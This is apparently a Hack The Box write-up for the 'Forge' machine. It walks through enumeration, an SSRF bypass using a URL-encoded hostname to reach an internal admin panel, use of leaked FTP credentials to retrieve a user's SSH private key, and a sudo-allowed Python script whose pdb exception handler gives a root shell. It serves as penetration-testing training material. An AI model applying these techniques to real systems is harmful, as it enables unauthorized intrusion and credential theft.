# Forge

Completed: Yes Created: November 2, 2021 4:40 PM Platform: Hack The Box

## Enumeration

### Nmap

```bash
PORT      STATE    SERVICE   VERSION
21/tcp    filtered ftp
22/tcp    open     ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http      Apache httpd 2.4.41
5868/tcp  closed   diameters
11085/tcp closed   unknown
17872/tcp closed   unknown
18615/tcp closed   unknown
18841/tcp closed   unknown
31178/tcp closed   unknown
35846/tcp closed   unknown
51598/tcp closed   unknown
52445/tcp closed   unknown
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### http

dirs brute force:

```bash
301        4l       24w      224c http://forge.htb/uploads
301        9l       28w      307c http://forge.htb/static
301        9l       28w      314c http://forge.htb/static/images
200       33l       58w      929c http://forge.htb/upload
301        9l       28w      311c http://forge.htb/static/css
301        9l       28w      310c http://forge.htb/static/js
```

vhost brute force:

```bash
ffuf -u http://forge.htb/ -H "Host: FUZZ.forge.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fc 302

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://forge.htb/
 :: Wordlist         : FUZZ: /root/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.forge.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 302
________________________________________________

admin                   [Status: 200, Size: 27, Words: 4, Lines: 2]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

admin.forge.htb contains message that we can only access from localhost...

When I tried to download a file from not existed url, I got the next error:

```
An error occured! Error : HTTPConnectionPool(host='forforgege.htb', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f9043468df0>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))e
```

This error indicates about Python.

```bash
nc -lvnp 4444                                                                                                            
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.111] 50722
GET / HTTP/1.1
Host: 10.10.14.9:4444
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

## Gaining access

On the `/upload` function, we can upload from url, here we can try SSRF and somehow access the admin panel. Tried to bypass it with different payloads from PayloadsAllTheThings, but got success with simple url encoding. In browser: `http://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62/`. Then, it gives you the url and we can request it with curl.

```bash
curl http://forge.htb/uploads/wF31DSm57Zz9U98rK4eX                                                                                                                                                                                 130 ⨯
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

Try to do the same with `/announcements`:

```bash
curl http://forge.htb/uploads/as1jlpMLdqWWxClFhZJw
<!DOCTYPE html>
<html>
<head>
    <title>Announcements</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br>
    <ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
</body>
</html>
```

I wrote a simple script to automate the attack a little bit:

```bash
python3 ssrf_exploit.py                                                                                                                                                                                                            255 ⨯
SSRF for /
<!DOCTYPE html>                                                                                                                                                                                                                              
<html>                                                                                                                                                                                                                                       
<head>                                                                                                                                                                                                                                       
    <title>Admin Portal</title>                                                                                                                                                                                                              
</head>                                                                                                                                                                                                                                      
<body>                                                                                                                                                                                                                                       
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">                                                                                                                                                                      
    <header>                                                                                                                                                                                                                                 
            <nav>                                                                                                                                                                                                                            
                <h1 class=""><a href="/">Portal home</a></h1>                                                                                                                                                                                
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>                                                                                                                                         
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>                                                                                                                                                              
            </nav>                                                                                                                                                                                                                           
    </header>                                                                                                                                                                                                                                
    <br><br><br><br>                                                                                                                                                                                                                         
    <br><br><br><br>                                                                                                                                                                                                                         
    <center><h1>Welcome Admins!</h1></center>                                                                                                                                                                                                
</body>                                                                                                                                                                                                                                      
</html>                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                             
SSRF for /announcements                                                                                                                                                                                                                      
<!DOCTYPE html>                                                                                                                                                                                                                              
<html>                                                                                                                                                                                                                                       
<head>                                                                                                                                                                                                                                       
    <title>Announcements</title>                                                                                                                                                                                                             
</head>                                                                                                                                                                                                                                      
<body>                                                                                                                                                                                                                                       
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">                                                                                                                                                                      
    <link rel="stylesheet" type="text/css" href="/static/css/announcements.css">                                                                                                                                                             
    <header>                                                                                                                                                                                                                                 
            <nav>                                                                                                                                                                                                                            
                <h1 class=""><a href="/">Portal home</a></h1>                                                                                                                                                                                
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>                                                                                                                                         
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>                                                                                                                                                              
            </nav>                                                                                                                                                                                                                           
    </header>                                                                                                                                                                                                                                
    <br><br><br>                                                                                                                                                                                                                             
    <ul>                                                                                                                                                                                                                                     
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>                                                                                                                                         
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>                                                                                                                               
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>                                                                          
    </ul>                                                                                                                                                                                                                                    
</body>                                                                                                                                                                                                                                      
</html>                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                             
SSRF for /upload                                                                                                                                                                                                                             
<!DOCTYPE html>                                                                                                                                                                                                                              
<html>                                                                                                                                                                                                                                       
<head>                                                                                                               
    <title>Upload an image</title>                                                                                   
</head>                                                                                                              
<body onload="show_upload_local_file()">                                                                             
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">                                              
    <link rel="stylesheet" type="text/css" href="/static/css/upload.css">                                            
    <script type="text/javascript" src="/static/js/main.js"></script>                                                
    <header>                                                                                                         
            <nav>                                                                                                    
                <h1 class=""><a href="/">Portal home</a></h1>                                                        
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>                 
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>                                      
            </nav>                                                                                                   
    </header>                                                                                                        
    <center>                                                                                                         
        <br><br>                                                                                                     
        <div id="content">                                                                                           
            <h2 onclick="show_upload_local_file()">                                                                  
                Upload local file                                                                                    
            </h2>                                                                                                    
            <h2 onclick="show_upload_remote_file()">                                                                 
                Upload from url                                                                                      
            </h2>                                                                                                    
            <div id="form-div">                                                                                      
                                                                                                                     
            </div>                                                                                                   
        </div>                                                                                                       
    </center>                                                                                                        
    <br>                                                                                                             
    <br>                                                                                                             
</body>                                                                                                              
</html>                                                                                                              
                                                                                                                     
SSRF for /upload?u=ftp://user:heightofsecurity123!@2130706433/                                                       
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap                                                         
-rw-r-----    1 0        1000           33 Nov 02 13:41 user.txt
```

The ftp gives us access to the home folder of the `user`. So, the box has ssh port, we can consider that this user has a `.ssh` folder. And yeah it does.

```bash
┌──(root💀kali)-[~/…/HackTheBox/Medium/Forge/gaining_access]
└─# curl http://forge.htb/uploads/gh91oc6bixnaBb3XqvrQ > id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2590  100  2590    0     0  18239      0 --:--:-- --:--:-- --:--:-- 18239
                                                                                                                                                                                                                                             
┌──(root💀kali)-[~/…/HackTheBox/Medium/Forge/gaining_access]
└─# ssh -i id_rsa user@forge                                   
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 04 Nov 2021 02:00:16 PM UTC

  System load:  0.2               Processes:             223
  Usage of /:   43.8% of 6.82GB   Users logged in:       0
  Memory usage: 21%               IPv4 address for eth0: 10.10.11.111
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Aug 20 01:32:18 2021 from 10.10.14.6
user@forge:~$
```

## Privilege escalation

First thing first, check sudo permissions:

```bash
user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

Check remote-manage.py:

```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

You can see that the script has import of pdb and then uses it inside exception processing. So, when we trigger an exception, we will go right to the pdb where we can execute whatever we want or just spawn a shell:

```bash
user@forge:/opt$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:56954
invalid literal for int() with base 10: b'asdfasdfasd'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) import os
(Pdb) os.system('/bin/bash')
root@forge:/opt#
```

Now, we got the root flag.
